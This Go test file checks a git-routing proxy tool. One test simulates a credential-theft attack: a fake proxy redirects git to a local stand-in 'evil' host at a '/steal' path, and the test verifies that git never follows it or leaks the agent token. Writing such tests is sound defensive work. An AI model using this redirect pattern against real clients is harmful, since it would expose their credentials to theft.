package main

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"strings"
	"sync"
	"testing"
	"time"
)

// offHost records every request that reaches it: it stands for a host the
// proxy (or anything answering in its place) redirects git to.
type offHost struct {
	srv  *httptest.Server
	mu   sync.Mutex
	seen []string
}

func newOffHost(t *testing.T) *offHost {
	o := &offHost{}
	o.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		o.mu.Lock()
		o.seen = append(o.seen, fmt.Sprintf("%s %s %v", r.Method, r.URL, r.Header))
		o.mu.Unlock()
		http.NotFound(w, r)
	}))
	t.Cleanup(o.srv.Close)
	return o
}

// TestGitNeverCarriesTheAgentTokenAcrossARedirect is the auditor's probe with
// real git: the routing connect-git writes sends the agent's token to the proxy
// (control), and when the proxy answers a redirect to ANOTHER host, git does not
// follow it — so that host never sees the token, nor any request.
func TestGitNeverCarriesTheAgentTokenAcrossARedirect(t *testing.T) {
	gitEnv(t)
	f := newFakeMuster(t)
	evil := newOffHost(t)
	f.onProxy = func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, evil.srv.URL+"/steal"+r.URL.Path+"?"+r.URL.RawQuery, http.StatusFound)
	}
	t.Setenv(envConnectURL, f.srv.URL)
	t.Setenv(envAgentToken, fakeAgentToken)
	var out, errb bytes.Buffer
	if rc := runConnectGit(nil, &out, &errb); rc != 0 {
		t.Fatalf("connect-git: rc=%d %s %s", rc, out.String(), errb.String())
	}
	_ = exec.Command("git", "ls-remote", "https://github.com/example-org/repo.git").Run()

	f.mu.Lock()
	n := len(f.proxied)
	var tok string
	if n > 0 {
		tok = f.proxied[0].Header.Get("X-Muster-Token")
	}
	f.mu.Unlock()
	if n == 0 || tok != fakeAgentToken {
		t.Fatalf("control: the proxy saw %d request(s), token %q — the probe exercised nothing", n, tok)
	}
	evil.mu.Lock()
	defer evil.mu.Unlock()
	for _, s := range evil.seen {
		if strings.Contains(s, fakeAgentToken) {
			t.Fatalf("git carried the agent's token to the redirect target: %s", s)
		}
	}
	if len(evil.seen) != 0 {
		t.Fatalf("git followed the redirect off the proxy: %v", evil.seen)
	}
}

func gitConfig(t *testing.T) string {
	t.Helper()
	b, _ := os.ReadFile(os.Getenv("GIT_CONFIG_GLOBAL"))
	return string(b)
}

// waitFor polls cond for up to 5s.
func waitFor(t *testing.T, what string, cond func() bool) {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for !cond() {
		if time.Now().After(deadline) {
			t.Fatalf("timed out waiting for %s; git config:\n%s", what, gitConfig(t))
		}
		time.Sleep(20 * time.Millisecond)
	}
}

// TestGitRoutingFollowsTheGrantWithoutARestart runs the loop `ccd serve` runs
// and changes ONLY muster's answer: an approval appears as routing, a
// revocation removes it, a re-approval restores it, and a connector muster stops
// listing (deleted) loses its routing — no command from the agent, no restart.
func TestGitRoutingFollowsTheGrantWithoutARestart(t *testing.T) {
	gitEnv(t)
	f := newFakeMuster(t)
	f.grant = "pending"
	routed := func() bool {
		return strings.Contains(gitConfig(t), f.srv.URL+"/connect/github/github.com/") &&
			strings.Contains(gitConfig(t), "followRedirects = false") &&
			strings.Contains(gitConfig(t), fakeAgentToken)
	}
	clean := func() bool {
		c := gitConfig(t)
		return !strings.Contains(c, "/connect/github/") && !strings.Contains(c, fakeAgentToken)
	}
	set := func(grant string, listed bool) {
		f.mu.Lock()
		f.grant, f.listed = grant, listed
		f.mu.Unlock()
	}
	set("pending", true)
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() {
		defer close(done)
		runGitRoutingLoop(ctx, f.srv.URL, fakeAgentToken, 30*time.Millisecond, t.Logf)
	}()
	defer func() { cancel(); <-done }()

	time.Sleep(150 * time.Millisecond)
	if !clean() {
		t.Fatalf("routing written while the grant is pending:\n%s", gitConfig(t))
	}
	set("approved", true)
	waitFor(t, "routing after approval", routed)
	set("revoked", true)
	waitFor(t, "routing removed after revocation", clean)
	set("approved", true)
	waitFor(t, "routing after re-approval", routed)
	set("approved", false)
	waitFor(t, "routing removed once muster no longer lists the connector", clean)
	f.mu.Lock()
	posted := f.posted
	f.mu.Unlock()
	if posted {
		t.Fatal("the sync filed a request; asking is the connector_request tool's job only")
	}
}

// TestASteadySyncWritesNothing: with the routing already correct, a sync round
// changes nothing — so a git command running at that moment never sees the
// routing torn down and rebuilt.
func TestASteadySyncWritesNothing(t *testing.T) {
	gitEnv(t)
	f := newFakeMuster(t)
	ctx := context.Background()
	if changed, err := syncGitRouting(ctx, f.srv.URL, fakeAgentToken); err != nil || len(changed) != 1 {
		t.Fatalf("first sync: changed=%v err=%v, want the one connector", changed, err)
	}
	before := gitConfig(t)
	st, _ := os.Stat(os.Getenv("GIT_CONFIG_GLOBAL"))
	time.Sleep(20 * time.Millisecond)
	if changed, err := syncGitRouting(ctx, f.srv.URL, fakeAgentToken); err != nil || len(changed) != 0 {
		t.Fatalf("steady sync: changed=%v err=%v, want nothing", changed, err)
	}
	st2, _ := os.Stat(os.Getenv("GIT_CONFIG_GLOBAL"))
	if gitConfig(t) != before || !st.ModTime().Equal(st2.ModTime()) {
		t.Fatal("a steady sync rewrote git's config")
	}
}
